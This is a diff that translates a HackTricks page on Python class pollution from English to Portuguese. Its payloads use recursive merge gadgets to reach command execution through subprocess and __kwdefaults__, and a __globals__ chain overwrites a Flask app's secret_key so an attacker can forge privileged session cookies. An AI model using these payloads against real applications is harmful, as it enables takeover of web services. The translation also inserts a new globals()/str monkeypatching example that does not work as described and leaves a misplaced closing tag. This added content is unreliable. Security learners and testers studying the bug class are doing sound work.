@@ -1,21 +1,20 @@
-# Class Pollution (Python's Prototype Pollution)
+# Poluição de Classe (Prototype Pollution do Python)
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## Basic Example
+## Exemplo Básico
 
-Check how is possible to pollute classes of objects with strings:
-
+Veja como é possível poluir classes de objetos com strings:
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -39,9 +38,7 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
-
-## Basic Vulnerability Example
-
+## Exemplo Básico de Vulnerabilidade
 ```python
 # Initial state
 class Employee: pass
@@ -74,13 +71,11 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-
-## Gadget Examples
+## Exemplos de Gadget
 
 <details>
 
-<summary>Creating class property default value to RCE (subprocess)</summary>
-
+<summary>Criando valor padrão de propriedade de classe para RCE (subprocesso)</summary>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -127,13 +122,32 @@ merge(USER_INPUT, recruiter_emp)
 print(system_admin_emp.execute_command())
 #> [!] Executing: "whoami", output: "abdulrah33m"
 ```
-
 </details>
 
 <details>
 
-<summary>Polluting other classes and global vars through <code>globals</code></summary>
+<summary>Poluindo outras classes e variáveis globais através de <code>globals</code></summary>
 
+Podemos usar a função `globals()` para poluir outras classes e variáveis globais. O seguinte exemplo mostra como podemos adicionar um novo método à classe `str`:
+
+```python
+def my_method(self):
+    return "hello world"
+
+globals()['str'].my_method = my_method
+
+print("".my_method())
+```
+
+Isso adicionará o método `my_method` à classe `str` e, em seguida, o método poderá ser chamado em qualquer instância da classe `str`. Da mesma forma, podemos poluir variáveis globais:
+
+```python
+globals()['my_var'] = 123
+
+print(my_var)
+```
+
+Isso adicionará a variável `my_var` ao escopo global e, em seguida, poderá ser acessada em qualquer lugar do código.
 ```python
 def merge(src, dst):
     # Recursive merge function
@@ -161,13 +175,13 @@ merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Pollut
 print(not_accessible_variable) #> Polluted variable
 print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 ```
-
 </details>
 
 <details>
 
-<summary>Arbitrary subprocess execution</summary>
+<summary>Execução arbitrária de subprocessos</summary> 
 
+</details>
 ```python
 import subprocess, json
 
@@ -195,15 +209,13 @@ merge(USER_INPUT, Employee())
 
 subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 ```
-
 </details>
 
 <details>
 
-<summary>Overwritting <strong><code>__kwdefaults__</code></strong></summary>
+<summary>Sobrescrevendo <strong><code>__kwdefaults__</code></strong></summary>
 
-**`__kwdefaults__`** is a special attribute of all functions, based on Python [documentation](https://docs.python.org/3/library/inspect.html), it is a “mapping of any default values for **keyword-only** parameters”. Polluting this attribute allows us to control the default values of keyword-only parameters of a function, these are the function’s parameters that come after \* or \*args.
-
+**`__kwdefaults__`** é um atributo especial de todas as funções, baseado na [documentação](https://docs.python.org/3/library/inspect.html) do Python, é um "mapeamento de quaisquer valores padrão para parâmetros **somente de palavra-chave**". Poluir esse atributo nos permite controlar os valores padrão dos parâmetros somente de palavra-chave de uma função, que são os parâmetros da função que vêm após \* ou \*args.
 ```python
 from os import system
 import json
@@ -240,24 +252,21 @@ print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
 execute() #> Executing echo Polluted
 #> Polluted
 ```
-
 </details>
 
 <details>
 
-<summary>Overwriting Flask secret across files</summary>
+<summary>Sobrescrevendo o segredo do Flask em diferentes arquivos</summary>
 
-So, if you can do a class pollution over an object defined in the main python file of the web but **whose class is defined in a different file** than the main one. Because in order to access \_\_globals\_\_ in the previous payloads you need to access the class of the object or methods of the class, you will be able to **access the globals in that file, but not in the main one**. \
-Therefore, you **won't be able to access the Flask app global object** that defined the **secret key** in the main page:
-
+Assim, se você pode fazer uma poluição de classe em um objeto definido no arquivo principal em Python da web, mas **cuja classe é definida em um arquivo diferente** do principal. Porque, para acessar \_\_globals\_\_ nos payloads anteriores, você precisa acessar a classe do objeto ou métodos da classe, você será capaz de **acessar os globais naquele arquivo, mas não no principal**. \
+Portanto, você **não poderá acessar o objeto global do aplicativo Flask** que definiu a **chave secreta** na página principal:
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
+Neste cenário, você precisa de um gadget para percorrer arquivos para chegar ao principal e **acessar o objeto global `app.secret_key`** para alterar a chave secreta do Flask e ser capaz de [**escalar privilégios** sabendo dessa chave](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
-In this scenario you need a gadget to traverse files to get to the main one to **access the global object `app.secret_key`** to change the Flask secret key and be able to [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
-
-A payload like this one [from this writeup](https://ctftime.org/writeup/36082):
+Um payload como este [deste writeup](https://ctftime.org/writeup/36082):
 
 {% code overflow="wrap" %}
 ```python
@@ -265,11 +274,11 @@ __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.se
 ```
 {% endcode %}
 
-Use this payload to **change `app.secret_key`** (the name in your app might be different) to be able to sign new and more privileges flask cookies.
+Use este payload para **alterar `app.secret_key`** (o nome em sua aplicação pode ser diferente) para ser capaz de assinar novos cookies flask com mais privilégios.
 
 </details>
 
-## References
+## Referências
 
 * [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
 
@@ -277,10 +286,10 @@ Use this payload to **change `app.secret_key`** (the name in your app might be d
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
